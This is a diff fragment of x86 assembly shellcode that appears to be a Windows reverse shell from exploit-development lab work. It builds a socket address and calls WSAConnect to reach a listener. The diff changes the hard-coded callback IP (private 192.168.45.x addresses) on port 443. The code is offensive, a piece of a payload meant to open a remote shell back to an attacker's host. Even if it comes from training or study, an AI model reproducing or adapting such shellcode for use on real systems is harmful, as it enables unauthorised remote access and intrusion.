@@ -145,7 +145,7 @@ call_wsaconnect:                    #
     xor   eax, eax;                   # Null EAX
     push  eax;                        # sin_zero[] = NULL
     push  eax;                        # sin_zero[] = NULL
-    push    0xdf2da8c0                #   Push sin_addr (192.168.119.120) - 192.168.45.217 - 45.223
+    push    0xd42da8c0                #   Push sin_addr (192.168.119.120) - 192.168.45.217 - 45.223, 212
     mov     ax, 0xbb01                #   Move the sin_port (443) to AX
     shl   eax, 0x10;                  # EAX = Listener Port
     inc ax
